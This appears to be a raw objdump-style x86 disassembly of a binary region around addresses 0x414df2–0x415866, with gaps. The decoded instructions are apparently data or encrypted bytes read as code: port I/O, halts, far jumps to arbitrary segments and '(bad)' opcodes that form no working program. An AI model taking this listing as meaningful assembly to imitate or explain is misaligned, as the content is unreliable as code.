  414df2:	mov    edx,0xa1f4f021
  414df7:	fnsave ds:0xe93e84c9
  414dfd:	daa    
  414dfe:	das    
  414dff:	xchg   edx,eax
  414e00:	sub    bl,ch
  414e02:	jns    0x414e78
  414e04:	in     eax,0xa1
  414e06:	fs es in al,0xe8
  414e0a:	xor    ch,BYTE PTR [ecx+0xe34c914]
  414e10:	xchg   esi,eax
  414e11:	mov    ds:0x69151674,eax
  414e16:	sti    
  414e17:	push   cs
  414e18:	jecxz  0x414daa
  414e1a:	mov    BYTE PTR [eax],bl
  414e1c:	fidiv  DWORD PTR [esi-0x5d7bea3f]
  414e22:	imul   ebp,eax,0xffffffa9
  414e25:	mov    ecx,0x3981de94
  414e2a:	dec    edx
  414e2b:	repnz ins BYTE PTR es:[edi],dx
  414e2d:	sbb    eax,0x4cdcafc6
  414e32:	ins    DWORD PTR es:[edi],dx
  414e33:	leave  
  414e34:	pusha  
  414e35:	cwde   
  414e36:	lds    ebp,FWORD PTR [edi]
  414e38:	xchg   ebp,eax
  414e39:	cwde   
  414e3a:	mov    edi,DWORD PTR [esi]
  414e3c:	jmp    0x3b01de1f
  414e41:	inc    edi
  414e42:	repnz fxam 
  414e45:	test   eax,0x9fc58358
  414e4a:	test   BYTE PTR [esi-0x2e],al
  414e4d:	lods   al,BYTE PTR ss:[esi]
  414e4f:	enter  0x3e9b,0xfa
  414e53:	mov    esi,0x661cb269
  414e58:	jo     0x414df4
  414e5a:	pop    eax
  414e5b:	hlt    
  414e5c:	clc    
  414e5d:	in     eax,0x82
  414e5f:	lods   al,BYTE PTR ds:[esi]
  414e60:	je     0x414e00
  414e62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e63:	shl    DWORD PTR [edi],0xb2
  414e66:	dec    ebx
  414e67:	push   es
  414e68:	stos   DWORD PTR es:[edi],eax
  414e69:	les    edi,FWORD PTR [ebx]
  414e6b:	scas   al,BYTE PTR es:[edi]
  414e6c:	mul    BYTE PTR [ebp-0x11]
  414e6f:	cmc    
  414e70:	aaa    
  414e71:	fsub   QWORD PTR [edx+edx*8+0x3d]
  414e75:	test   DWORD PTR [eax+edx*2],0xf49bb970
  414e7c:	pop    edx
  414e7d:	push   ebx
  414e7e:	push   0xfffffff3
  414e80:	mov    ds:0x41e86f33,al
  414e85:	mov    cs,WORD PTR ds:0x1a7964c0
  414e8b:	inc    eax
  414e8c:	pop    ebx
  414e8d:	xchg   edi,eax
  414e8e:	pop    ds
  414e8f:	pop    edx
  414e90:	sbb    BYTE PTR ds:0x932c0477,bh
  414e96:	loop   0x414ec6
  414e98:	mov    eax,0x30a7a17e
  414e9d:	sbb    al,0xe2
  414e9f:	push   0xdf084e76
  414ea4:	or     DWORD PTR [eax+ecx*2+0x27],ecx
  414ea8:	or     DWORD PTR [esi-0x17],0x28a50414
  414eaf:	cmp    BYTE PTR [eax],bh
  414eb1:	inc    esp
  414eb2:	adc    BYTE PTR [ebp+0x19],dh
	...
  414f15:	add    BYTE PTR [edi],dh
  414f17:	data16 xor al,0x9b
  414f1a:	jne    0x414ef7
  414f1c:	mov    edi,0x6e73ee
  414f21:	xchg   ebp,eax
  414f22:	xchg   ebx,eax
  414f23:	ds add eax,0xda3a64
  414f29:	add    BYTE PTR [edi],al
  414f2b:	add    DWORD PTR [eax],eax
  414f2d:	add    BYTE PTR [esi+ebx*1-0x20],dl
  414f31:	cmp    DWORD PTR [edx-0x636cf38e],ebp
  414f37:	mov    WORD PTR [ebx],?
  414f39:	arpl   WORD PTR [edi],bp
  414f3b:	iret   
  414f3c:	gs in  al,dx
  414f3e:	pop    edx
  414f3f:	out    0x98,eax
  414f41:	sbb    DWORD PTR [ebx+0x696e19ca],ebx
  414f47:	jg     0x414f8c
  414f49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f4a:	frndint 
  414f4c:	mov    ebx,0xacc7fb72
  414f51:	add    ebp,eax
  414f53:	mov    edi,0x9286b9c1
  414f58:	inc    ecx
  414f59:	mov    ah,0xce
  414f5b:	fdivr  DWORD PTR [ebx]
  414f5d:	push   ds
  414f5e:	mov    esi,0xdd69b976
  414f63:	adc    DWORD PTR ds:0xb099081a,edi
  414f69:	test   edx,esp
  414f6b:	push   ebp
  414f6c:	lock movnti DWORD PTR [edx-0x6e3d4187],esi
  414f74:	int3   
  414f75:	dec    esi
  414f76:	ss mov bl,0x97
  414f79:	mov    bh,0x32
  414f7b:	mov    al,0x8b
  414f7d:	dec    edx
  414f7f:	cmp    ah,bh
  414f81:	inc    esp
  414f82:	add    ebp,DWORD PTR [edi]
  414f84:	(bad)  
  414f85:	lods   al,BYTE PTR ds:[esi]
  414f86:	and    esi,DWORD PTR ds:0x9ed05dd8
  414f8c:	shl    edi,1
  414f8e:	xchg   edi,eax
  414f8f:	push   cs
  414f90:	out    0xb7,eax
  414f92:	push   ds
  414f93:	dec    edi
  414f94:	call   0x602e:0x1e6e94f2
  414f9b:	lahf   
  414f9c:	arpl   WORD PTR [ebp*2+0x7fe4f3f],si
  414fa3:	es in  eax,dx
  414fa5:	ror    DWORD PTR [edx+0x4],1
  414fa8:	xor    al,0x26
  414faa:	pop    es
  414fab:	mov    ch,ah
  414fad:	rol    DWORD PTR [edi],cl
  414faf:	jbe    0x414f9c
  414fb1:	aas    
  414fb2:	jns    0x414f52
  414fb4:	dec    ebx
  414fb5:	pop    ebp
  414fb6:	mov    esi,0x45355a29
  414fbb:	std    
  414fbc:	and    BYTE PTR [ecx],cl
  414fbe:	ss out 0x1f,eax
  414fc1:	daa    
  414fc2:	loopne 0x415037
  414fc4:	sbb    al,0x21
  414fc6:	mov    ebx,0x961a194c
  414fcb:	sub    bl,BYTE PTR [edx+0x20]
  414fce:	xlat   BYTE PTR ds:[ebx]
  414fcf:	frstor [edx]
  414fd1:	adc    al,0x29
  414fd3:	dec    edx
  414fd4:	imul   ebp,DWORD PTR [ebx+0xb926391],0x6b
  414fdb:	mov    edi,0xc111e0c
  414fe0:	imul   eax
  414fe2:	pushf  
  414fe3:	imul   esp,DWORD PTR [edi+0x5d],0xe53475cb
  414fea:	adc    BYTE PTR [edi+0x4c],0x4e
  414fee:	out    dx,eax
  414fef:	inc    esp
  414ff0:	xor    DWORD PTR [ecx+ecx*4+0x7a2e6b29],ebp
  414ff7:	in     al,dx
  414ff8:	jb     0x415076
  414ffa:	loope  0x41502d
  414ffc:	arpl   WORD PTR [ebx],bx
  414ffe:	ja     0x415008
  415000:	fbstp  TBYTE PTR [ecx]
  415002:	cmp    dl,ah
  415004:	or     ecx,DWORD PTR [edi-0x3a157aae]
  41500a:	jnp    0x414fff
  41500c:	not    DWORD PTR [eax-0x3e2c7b48]
  415012:	loop   0x414fdf
  415014:	mov    eax,ds:0x15c44d58
  415019:	aad    0x7c
  41501b:	int3   
  41501c:	jns    0x414fce
  41501e:	sahf   
  41501f:	ficomp WORD PTR [ecx-0x4a9a964d]
  415025:	mov    al,0x55
  415027:	dec    esp
  415028:	xchg   edx,eax
  415029:	add    bh,al
  41502b:	push   edi
  41502c:	mov    edi,?
  41502e:	fstp   TBYTE PTR [ecx]
  415030:	fld    st(3)
  415032:	ins    DWORD PTR es:[edi],dx
  415033:	jmp    0x41502c
	...
  415095:	add    BYTE PTR [ebx+0x2],bh
  415098:	add    ebp,ebx
  41509a:	jnp    0x415087
  41509c:	sti    
  41509d:	xchg   edx,eax
  41509e:	and    BYTE PTR [ebx],ah
  4150a0:	pushf  
  4150a1:	test   eax,0xc2231873
  4150a6:	inc    ecx
  4150a7:	fild   DWORD PTR [eax]
  4150a9:	add    BYTE PTR [edi],al
  4150ab:	add    DWORD PTR [eax],eax
  4150ad:	add    dh,ch
  4150af:	xor    bl,BYTE PTR [ebx-0x73]
  4150b2:	fnstenv [ecx-0x6f]
  4150b5:	ins    DWORD PTR es:[edi],dx
  4150b6:	xor    eax,0x69083b63
  4150bb:	fistp  WORD PTR [ecx]
  4150bd:	lahf   
  4150be:	inc    dh
  4150c0:	jmp    0xd33c94ba
  4150c5:	cdq    
  4150c6:	sbb    ah,BYTE PTR [edi]
  4150c8:	int    0x6a
  4150ca:	and    eax,0x95ba5e34
  4150cf:	out    0xb6,al
  4150d1:	xor    BYTE PTR [eax+0x11],ah
  4150d4:	aad    0x3f
  4150d6:	stos   DWORD PTR es:[edi],eax
  4150d7:	push   cs
  4150d8:	dec    ebx
  4150d9:	dec    edi
  4150da:	ret    
  4150db:	dec    ecx
  4150dc:	or     DWORD PTR [eax],esp
  4150de:	pop    ss
  4150df:	dec    ecx
  4150e0:	mov    dh,0x2e
  4150e2:	les    ebp,FWORD PTR [ebp-0x2b48504e]
  4150e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150e9:	push   esp
  4150ea:	rcl    DWORD PTR [edx],1
  4150ec:	mov    ds:0x2dcec9dd,eax
  4150f1:	leave  
  4150f2:	out    dx,eax
  4150f3:	mov    ebx,0x74e3e711
  4150f8:	xor    dh,dh
  4150fa:	push   esi
  4150fb:	push   ebx
  4150fc:	inc    esp
  4150fd:	aaa    
  4150fe:	jle    0x41514e
  415100:	cmp    edx,DWORD PTR [esi]
  415102:	add    DWORD PTR [ecx+0x3],ebp
  415105:	cmp    eax,0xffa93e17
  41510a:	mov    ecx,0x60e693bc
  41510f:	xor    ch,BYTE PTR es:[ebp-0x3a]
  415113:	call   0xc78907fe
  415118:	mov    cl,0x6
  41511a:	stos   DWORD PTR es:[edi],eax
  41511b:	add    DWORD PTR [esp+0x54],ecx
  41511f:	clc    
  415120:	in     eax,0x26
  415122:	call   0x496468f2
  415127:	jbe    0x415115
  415129:	inc    ebp
  41512a:	jg     0x415198
  41512c:	and    al,0x8f
  41512e:	test   DWORD PTR [eax+0x2f],0xd0f8de43
  415135:	mov    bh,bl
  415137:	gs push ebx
  415139:	jmp    0x34b0:0xc10a4611
  415140:	add    DWORD PTR [ebx-0x4f],0xad2f8acc
  415147:	pop    ss
  415148:	adc    BYTE PTR ds:0x8a6eed88,0x7a
  41514f:	imul   eax,esi,0x8
  415152:	sub    DWORD PTR [ecx-0x5eb85c88],esi
  415158:	or     dl,dh
  41515a:	fdivrp st(6),st
  41515c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41515d:	mov    edx,0x1d32a088
  415162:	pop    ebx
  415163:	or     BYTE PTR [ebp-0x6bea0652],0xf0
  41516a:	sbb    eax,0x9156289b
  41516f:	out    0x8b,eax
  415171:	imul   eax,edx,0x3b
  415174:	push   edx
  415175:	pop    ebp
  415176:	adc    ecx,DWORD PTR [ecx-0x7ab731dd]
  41517c:	bound  eax,QWORD PTR [edx+0x53]
  41517f:	pop    edx
  415180:	lods   al,BYTE PTR ds:[esi]
  415181:	shr    BYTE PTR [edx],1
  415183:	arpl   ax,bx
  415185:	scas   eax,DWORD PTR es:[edi]
  415186:	call   0xdf619411
  41518b:	into   
  41518c:	fist   WORD PTR [esi+0x76]
  41518f:	clc    
  415190:	ret    
  415191:	xchg   ebx,eax
  415192:	mov    esi,0x348f2232
  415197:	rol    DWORD PTR [edi+0x42],cl
  41519a:	xchg   BYTE PTR [ebp-0x11f1c940],al
  4151a0:	fnsave [edi+eiz*1]
  4151a3:	or     eax,0xdd1e7b32
  4151a8:	imul   ebp,DWORD PTR [ebx+esi*4+0x61e754d5],0xffffffb4
  4151b0:	fld    QWORD PTR [esi]
  4151b2:	out    0xd0,al
  4151b4:	jae    0x4151b6
	...
  415216:	sub    al,0x97
  415218:	pop    ds
  415219:	sar    DWORD PTR [edi+0xffeed9],1
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	std    
  415221:	mov    al,0x7e
  415223:	bound  esp,QWORD PTR [ebx+0xdc48e0]
  415229:	add    BYTE PTR [edi],al
  41522b:	add    DWORD PTR [eax],eax
  41522d:	add    bl,dl
  41522f:	or     edi,DWORD PTR [ebp+0x24]
  415232:	jg     0x415242
  415234:	push   edx
  415235:	xchg   ebp,eax
  415236:	iret   
  415237:	mov    esi,0x93e482a2
  41523c:	xor    DWORD PTR [edx-0x1c],ebx
  41523f:	retf   0xa8f3
  415242:	cld    
  415243:	mov    esp,0xe7246e20
  415248:	xchg   ecx,eax
  415249:	mov    cl,0x40
  41524b:	out    dx,al
  41524c:	mov    esi,0x112dda81
  415251:	call   0x1ba0:0x7b13c319
  415258:	or     al,0xc0
  41525a:	mov    ebx,0x6f7565ab
  41525f:	mov    al,ds:0xca54125b
  415264:	inc    ecx
  415265:	mov    eax,ds:0xae94ae24
  41526a:	and    al,0xb6
  41526c:	leave  
  41526d:	push   ecx
  41526e:	cmp    eax,0xd8f9d83e
  415273:	adc    DWORD PTR [ecx],0xffffff90
  415276:	fbld   TBYTE PTR [ecx-0x4f545f3d]
  41527c:	sbb    DWORD PTR [edi],esp
  41527e:	add    DWORD PTR [edi-0x53],ecx
  415281:	mov    al,0xf1
  415283:	xor    dl,BYTE PTR [ebp+0x27]
  415286:	pop    esp
  415287:	jle    0x4152df
  415289:	cmc    
  41528a:	icebp  
  41528b:	test   eax,0xee85b355
  415290:	pop    ss
  415291:	scas   eax,DWORD PTR es:[edi]
  415292:	out    0x25,al
  415294:	or     BYTE PTR [ebx-0x2250c6c2],0xd5
  41529b:	popa   
  41529c:	call   DWORD PTR [eax+esi*8-0xf432656]
  4152a3:	out    0xad,al
  4152a5:	xor    cl,al
  4152a7:	lahf   
  4152a8:	stc    
  4152a9:	lods   eax,DWORD PTR ds:[esi]
  4152aa:	xor    edi,DWORD PTR ds:0x1e5f5ac8
  4152b0:	push   es
  4152b1:	shl    BYTE PTR [ecx-0x1],cl
  4152b4:	sub    eax,0xa3b80a9d
  4152b9:	mov    bh,BYTE PTR [edx-0x155a9e5b]
  4152bf:	sti    
  4152c0:	ficomp DWORD PTR [ebp+ebp*1-0x2844070a]
  4152c7:	fild   QWORD PTR [eax]
  4152c9:	mov    ebx,gs
  4152cb:	mov    WORD PTR [edi+0x3ebcc7de],?
  4152d1:	inc    eax
  4152d2:	mov    BYTE PTR [eax+ecx*2],dl
  4152d5:	ins    BYTE PTR es:[edi],dx
  4152d6:	lock call 0x2685:0xec1540a3
  4152de:	or     al,0xce
  4152e0:	daa    
  4152e1:	mov    dh,0x74
  4152e3:	sbb    BYTE PTR [esi-0x76],0x70
  4152e7:	mov    DWORD PTR [esi+0x6c0d1394],esp
  4152ed:	push   ecx
  4152ee:	enter  0xa692,0x15
  4152f2:	es mov cl,0xb1
  4152f5:	xlat   BYTE PTR ds:[ebx]
  4152f6:	fmul   st,st(0)
  4152f8:	pop    edx
  4152f9:	loopne 0x4152b1
  4152fb:	xchg   ebp,eax
  4152fc:	aas    
  4152fd:	pop    ecx
  4152fe:	xchg   esp,eax
  4152ff:	or     ecx,edx
  415301:	test   ah,0x8b
  415304:	test   DWORD PTR [ebx*1-0x968473c],0xe81bc406
  41530f:	cmc    
  415310:	push   esp
  415311:	add    DWORD PTR [ecx],edi
  415313:	sar    BYTE PTR ds:0xbc97959a,cl
  415319:	jne    0x415386
  41531b:	pop    ecx
  41531c:	hlt    
  41531d:	ret    0x6e7c
  415320:	mov    esp,0x5548b4fb
  415325:	inc    edx
  415326:	pop    esi
  415327:	and    DWORD PTR [ebp+0x10],esi
  41532a:	fmul   DWORD PTR [ebx]
  41532c:	loope  0x415302
  41532e:	jp     0x415335
  415330:	ret    
  415331:	cmp    DWORD PTR [ebp+0xda06],eax
	...
  415393:	add    BYTE PTR [eax],al
  415395:	add    BYTE PTR [ebp-0x10],ch
  415398:	repz jmp FWORD PTR cs:[edi]
  41539c:	std    
  41539d:	repz mov ebx,0x6c4b9b2a
  4153a3:	and    cl,bh
  4153a5:	cmp    DWORD PTR [edi-0x23],ecx
  4153a8:	add    BYTE PTR [eax],al
  4153aa:	pop    es
  4153ab:	add    DWORD PTR [eax],eax
  4153ad:	add    BYTE PTR [ecx+0x17],al
  4153b0:	enter  0x7913,0xe6
  4153b4:	add    ebp,esp
  4153b6:	sbb    DWORD PTR [edi-0x24],esi
  4153b9:	mov    bh,0xc4
  4153bb:	add    dh,0xd3
  4153be:	inc    ebx
  4153bf:	ins    DWORD PTR es:[edi],dx
  4153c0:	es dec ebp
  4153c2:	retf   
  4153c3:	test   ebx,edx
  4153c5:	sub    ch,BYTE PTR [eax+0x2e]
  4153c8:	jnp    0x4153ec
  4153ca:	push   edi
  4153cb:	adc    ebp,DWORD PTR [edx+ebx*4+0x1f]
  4153cf:	mov    dh,0xf0
  4153d1:	xchg   DWORD PTR [ebx+0x7d],ebx
  4153d4:	nop
  4153d5:	jno    0x41535c
  4153d7:	fldln2 
  4153d9:	std    
  4153da:	add    al,0xa6
  4153dc:	in     al,0xa8
  4153de:	(bad)  
  4153df:	repnz (bad) 
  4153e1:	(bad)  
  4153e2:	add    cl,BYTE PTR [ecx+0x4b11fca7]
  4153e8:	fld    TBYTE PTR ds:0xd9bfe803
  4153ee:	lods   eax,DWORD PTR ds:[esi]
  4153ef:	mov    ds:0x7033d643,al
  4153f4:	outs   dx,DWORD PTR ds:[esi]
  4153f5:	std    
  4153f6:	xor    BYTE PTR [edx],dh
  4153f8:	in     eax,0x5c
  4153fa:	cmp    al,0xa7
  4153fc:	pop    esp
  4153fd:	fisttp QWORD PTR [edx+0x42c5b592]
  415403:	scas   eax,DWORD PTR es:[edi]
  415404:	xor    ebp,DWORD PTR [ebx]
  415406:	std    
  415407:	push   0xf24719c0
  41540c:	ins    DWORD PTR es:[edi],dx
  41540d:	pop    eax
  41540e:	pop    edi
  41540f:	gs mov dl,0x40
  415412:	add    al,0xe7
  415414:	fwait
  415415:	mov    DWORD PTR [eax-0x32],0xc5e17f91
  41541c:	(bad)  
  41541e:	jp     0x41546d
  415420:	bound  edi,QWORD PTR [ebx]
  415422:	or     al,0xc6
  415424:	jnp    0x4153dc
  415426:	push   0xffffffe3
  415428:	stos   DWORD PTR es:[edi],eax
  415429:	aad    0xd1
  41542b:	popf   
  41542c:	jge    0x415443
  41542e:	inc    esi
  41542f:	je     0x41544a
  415431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415432:	and    bl,dl
  415434:	pusha  
  415435:	ss push 0xfffffff4
  415438:	xchg   BYTE PTR [ebx+eax*1],bh
  41543b:	cmp    BYTE PTR [edx-0x1ff180c],0x9e
  415442:	daa    
  415443:	mov    DWORD PTR [ebx+ebx*4+0x72423c6e],esi
  41544a:	out    dx,al
  41544b:	call   0xe68a:0xdaee0c97
  415452:	data16 cmp al,0xbb
  415455:	mov    al,ds:0x2ce024f4
  41545a:	fild   WORD PTR [edx+0x77]
  41545d:	shr    DWORD PTR [ecx+ebp*4],1
  415460:	add    eax,0xb06062a9
  415465:	aaa    
  415466:	inc    ecx
  415467:	adc    esi,DWORD PTR [ebx-0x7ce9b230]
  41546d:	cld    
  41546e:	xchg   ebx,eax
  41546f:	out    0xb1,al
  415471:	xchg   ecx,eax
  415472:	lods   al,BYTE PTR ds:[esi]
  415473:	mov    esp,0xfcd9423c
  415478:	in     al,dx
  415479:	xor    al,BYTE PTR [edx+0x6d]
  41547c:	or     al,0xbe
  41547e:	sub    dh,BYTE PTR [eax-0x42e54de6]
  415484:	test   DWORD PTR [eax+0x3f40650c],edx
  41548a:	aam    0x72
  41548c:	or     ch,BYTE PTR [ebp+0x4866d05]
  415492:	and    eax,0x4d1432af
  415497:	dec    ecx
  415498:	stos   DWORD PTR es:[edi],eax
  415499:	push   ebp
  41549a:	loope  0x4154c1
  41549c:	fidivr DWORD PTR [ecx+0x60]
  41549f:	pop    es
  4154a0:	mov    edi,0x3151cd03
  4154a5:	pop    ebp
  4154a6:	push   esp
  4154a7:	pop    ecx
  4154a8:	aad    0x53
  4154aa:	jg     0x4154ea
  4154ac:	xlat   BYTE PTR ds:[ebx]
  4154ad:	out    0x8,eax
  4154af:	adc    eax,0x779cea8
  4154b4:	retf   
	...
  415515:	add    ah,ah
  415517:	lock sub DWORD PTR [edx],ecx
  41551a:	cmp    eax,0xc0fee7db
  41551f:	cmp    ebx,DWORD PTR [edi]
  415521:	pop    esp
  415522:	adc    bh,BYTE PTR [edx-0x21a91078]
  415528:	add    BYTE PTR [eax],al
  41552a:	pop    es
  41552b:	add    DWORD PTR [eax],eax
  41552d:	add    BYTE PTR [ebp+0x15],cl
  415530:	pop    edx
  415531:	push   ebx
  415532:	sub    BYTE PTR [edx],0x0
  415535:	sbb    cl,BYTE PTR [ebp-0x38d40ae3]
  41553b:	(bad)  
  41553c:	xchg   ecx,eax
  41553d:	test   al,0x6c
  41553f:	and    edi,DWORD PTR [edx-0x21]
  415542:	in     eax,0x14
  415544:	iret   
  415545:	daa    
  415546:	mov    BYTE PTR [esi],dl
  415548:	push   0x551cce6d
  41554d:	into   
  41554e:	std    
  41554f:	pop    ebp
  415550:	mov    dl,0x6b
  415552:	pop    eax
  415553:	mov    ds:0xed4af495,al
  415558:	push   eax
  415559:	mov    al,0xa2
  41555b:	push   eax
  41555c:	mov    ch,BYTE PTR [ecx-0xc]
  41555f:	push   eax
  415560:	iret   
  415561:	into   
  415562:	push   ebx
  415563:	cld    
  415564:	leave  
  415565:	leave  
  415566:	enter  0xf427,0xd5
  41556a:	gs scas al,BYTE PTR es:[edi]
  41556c:	and    eax,0xce65d9cb
  415571:	mov    esp,0xc72192bb
  415576:	cdq    
  415577:	xor    al,0xaa
  415579:	popf   
  41557a:	mov    edi,0xbe2bf40d
  41557f:	jmp    0x8ccf:0x55bd4b4c
  415586:	push   0xffffff88
  415588:	sbb    DWORD PTR [eax],edx
  41558a:	push   edi
  41558b:	xchg   DWORD PTR [esi+0x50f8da7c],ebx
  415591:	adc    esp,ebp
  415593:	or     eax,0x2b1c19a3
  415598:	mov    al,bh
  41559a:	and    ebp,edi
  41559c:	inc    esp
  41559d:	mov    ecx,0x91a26a4c
  4155a2:	pushf  
  4155a3:	mov    eax,0xeecf17b6
  4155a8:	adc    al,0xa2
  4155ab:	(bad)  
  4155ac:	call   0xa1cd:0xa732cc02
  4155b3:	gs loope 0x415614
  4155b6:	sahf   
  4155b7:	and    eax,0x8a6f27d9
  4155bc:	mov    ah,0x37
  4155be:	outs   dx,BYTE PTR ds:[esi]
  4155bf:	add    eax,0xa47fab52
  4155c4:	icebp  
  4155c5:	adc    eax,0xa8a1011e
  4155ca:	and    edi,DWORD PTR [ebp+0x74]
  4155cd:	push   ebx
  4155ce:	sub    ah,0xe4
  4155d1:	pushf  
  4155d2:	add    ebp,DWORD PTR [edx]
  4155d4:	icebp  
  4155d5:	bnd ja 0x415608
  4155d8:	push   0x7953d938
  4155dd:	adc    eax,0x97ebfabb
  4155e2:	rol    BYTE PTR ds:0x4b8fc707,0xce
  4155e9:	outs   dx,DWORD PTR ds:[esi]
  4155ea:	fdivr  QWORD PTR [eax]
  4155ec:	xor    cl,BYTE PTR [eax-0x5a]
  4155ef:	mov    cl,0x36
  4155f1:	sub    BYTE PTR [ebx+0x71],ch
  4155f4:	xchg   esi,eax
  4155f5:	xor    ecx,edx
  4155f7:	inc    ebx
  4155f8:	ins    DWORD PTR es:[edi],dx
  4155f9:	(bad)  
  4155fa:	and    DWORD PTR [ebx-0x52],ebx
  4155fd:	ds push ss
  4155ff:	mov    esp,DWORD PTR [ecx-0x7bef090e]
  415605:	or     DWORD PTR [ecx+0x4e],edi
  415608:	push   edx
  415609:	push   esi
  41560a:	sub    eax,0x4794e8e1
  41560f:	xchg   esp,eax
  415610:	xor    al,0x2
  415612:	xchg   edi,eax
  415613:	out    0x65,al
  415615:	xchg   ebp,eax
  415616:	sub    eax,0x8c968acd
  41561b:	out    0xb9,eax
  41561d:	jae    0x415643
  41561f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415620:	pushf  
  415621:	scas   al,BYTE PTR es:[edi]
  415622:	das    
  415623:	or     BYTE PTR [edx],cl
  415625:	mov    ds:0xa78c2ed2,eax
  41562a:	dec    ebx
  41562b:	jmp    0xe000ab07
  415630:	jg     0x4155bf
  415632:	mov    dl,BYTE PTR [esi]
  415634:	lods   al,BYTE PTR ds:[esi]
	...
  415695:	add    BYTE PTR [ebp-0x66],ch
  415698:	mov    esp,0xfd67ff45
  41569d:	mov    edx,0xaffd40cb
  4156a2:	add    esp,edx
  4156a4:	pop    ss
  4156a5:	js     0x415704
  4156a7:	fild   WORD PTR [eax]
  4156a9:	add    BYTE PTR [edi],al
  4156ab:	add    DWORD PTR [eax],eax
  4156ad:	add    cl,cl
  4156af:	aaa    
  4156b0:	in     al,dx
  4156b1:	loope  0x4156fd
  4156b3:	fwait
  4156b4:	inc    ecx
  4156b5:	jle    0x415681
  4156b7:	inc    ecx
  4156b8:	jno    0x415735
  4156ba:	and    al,0x3a
  4156bc:	push   cs
  4156bd:	inc    ebp
  4156be:	fsub   QWORD PTR [ebx+0x4]
  4156c1:	icebp  
  4156c2:	inc    ecx
  4156c3:	jo     0x415702
  4156c5:	xchg   edi,eax
  4156c6:	jns    0x415656
  4156c8:	repnz pop ecx
  4156ca:	shl    eax,0x54
  4156cd:	dec    esp
  4156ce:	push   ds
  4156cf:	mov    bh,0xa
  4156d1:	test   BYTE PTR ds:0xb670afb2,0xc6
  4156d8:	les    ebp,FWORD PTR [ebp-0x35b62ab]
  4156de:	test   al,0x53
  4156e0:	in     eax,0x8f
  4156e2:	mov    WORD PTR [ebx+0x3c],gs
  4156e5:	or     ch,BYTE PTR [edx-0x1b4ec81c]
  4156eb:	in     eax,0xc8
  4156ed:	(bad)  
  4156ee:	mov    cl,0xa1
  4156f0:	sti    
  4156f1:	dec    ecx
  4156f2:	mov    ah,0x6
  4156f4:	or     eax,0x13af4398
  4156f9:	mov    bh,0x85
  4156fb:	aas    
  4156fc:	inc    edi
  4156fd:	fdivr  st(7),st
  4156ff:	repnz arpl WORD PTR [eax-0x20],dx
  415703:	sbb    ah,BYTE PTR [esi-0x26]
  415706:	or     DWORD PTR [esi-0x79],edx
  415709:	retf   
  41570a:	sbb    dh,0xc2
  41570d:	adc    ebp,0xef55e3c8
  415713:	xor    BYTE PTR ds:0xaf110e3d,ch
  415719:	push   ss
  41571a:	sub    al,0xcd
  41571c:	fld    DWORD PTR [edx+0x2a939cfc]
  415722:	popa   
  415723:	adc    BYTE PTR [esi-0x26],0x7e
  415727:	ret    
  415728:	adc    al,0x84
  41572a:	cdq    
  41572b:	sub    ecx,DWORD PTR [esi]
  41572d:	adc    edi,DWORD PTR [edx+0x0]
  415730:	xlat   BYTE PTR ds:[ebx]
  415731:	lods   al,BYTE PTR ds:[esi]
  415732:	or     ah,ch
  415734:	adc    eax,0x26884a28
  415739:	mov    ebx,0xe83ddedc
  41573e:	mov    bl,0xb1
  415740:	and    dh,BYTE PTR [edi-0x7c]
  415743:	jecxz  0x41579a
  415745:	mov    ch,0x60
  415747:	add    al,BYTE PTR [ebx+0x3478e73b]
  41574d:	in     eax,dx
  41574e:	dec    ecx
  41574f:	aam    0x1
  415751:	sbb    eax,0x89cc25c3
  415756:	dec    edi
  415757:	ret    
  415758:	(bad)  
  415759:	xchg   edx,eax
  41575a:	xchg   edi,eax
  41575b:	cwde   
  41575c:	fs repz push cs
  41575f:	push   edx
  415760:	mov    edx,0x9a9ba992
  415765:	push   ebx
  415766:	push   edi
  415767:	adc    BYTE PTR [edx+0x6cd82463],ch
  41576d:	add    ecx,DWORD PTR [eax+0x30]
  415770:	fbld   TBYTE PTR [edx-0x6a]
  415773:	scas   al,BYTE PTR es:[edi]
  415774:	mov    esp,edx
  415776:	and    ah,BYTE PTR [edi]
  415778:	mov    ebp,DWORD PTR [edx]
  41577a:	mov    BYTE PTR [esi+0x58],0x57
  41577e:	cmp    edx,DWORD PTR [edi-0x13]
  415781:	and    esp,DWORD PTR [edi]
  415783:	xchg   DWORD PTR [ebp+0x2c65913c],esp
  415789:	dec    ebp
  41578a:	xlat   BYTE PTR ds:[ebx]
  41578b:	cs test eax,0x8fdcc543
  415791:	sub    al,0x23
  415793:	mov    eax,es:0x6c85ef7
  415799:	mov    dl,0x43
  41579b:	jl     0x41579f
  41579d:	jecxz  0x415770
  41579f:	and    BYTE PTR [esi],ah
  4157a1:	clc    
  4157a2:	sahf   
  4157a3:	repnz cmp bh,BYTE PTR [ebx+0x1e]
  4157a7:	push   ss
  4157a8:	outs   dx,DWORD PTR ds:[esi]
  4157a9:	test   BYTE PTR [ecx],0x8d
  4157ac:	mov    edi,0x71ec5b83
  4157b1:	inc    esp
  4157b2:	shr    DWORD PTR [edx+0x72],cl
	...
  415815:	add    bl,cl
  415817:	(bad)  
  415818:	xchg   ebx,eax
  415819:	in     al,dx
  41581a:	mov    bh,0xed
  41581c:	(bad)  
  41581d:	inc    DWORD PTR [ecx+0x65ae69e3]
  415823:	mov    eax,0xe064c2d3
  415828:	add    BYTE PTR [eax],al
  41582a:	pop    es
  41582b:	add    DWORD PTR [eax],eax
  41582d:	add    BYTE PTR [esp+eiz*8],ah
  415830:	pop    ds
  415831:	fsubp  st(0),st
  415833:	and    DWORD PTR [ebp-0x8],ecx
  415836:	ja     0x4157f9
  415838:	mov    esi,0x456b2be
  41583d:	xchg   BYTE PTR [edi+0x6e0f7a1a],cl
  415843:	lahf   
  415844:	bound  esi,QWORD PTR [ecx+0x17]
  415847:	rcl    ebp,1
  415849:	mov    al,0x1
  41584b:	mov    dl,0xbb
  41584d:	addr16 jmp 0x41584a
  415850:	lahf   
  415851:	and    DWORD PTR [edx],ebx
  415853:	out    0x59,eax
  415855:	std    
  415856:	sti    
  415857:	jnp    0x41583d
  415859:	test   esp,edi
  41585b:	jmp    0x415822
  41585d:	out    dx,eax
  41585e:	stc    
  41585f:	inc    esi
  415860:	xchg   ebp,eax
  415861:	or     eax,0xd4cd5c07
  415866:	push   es
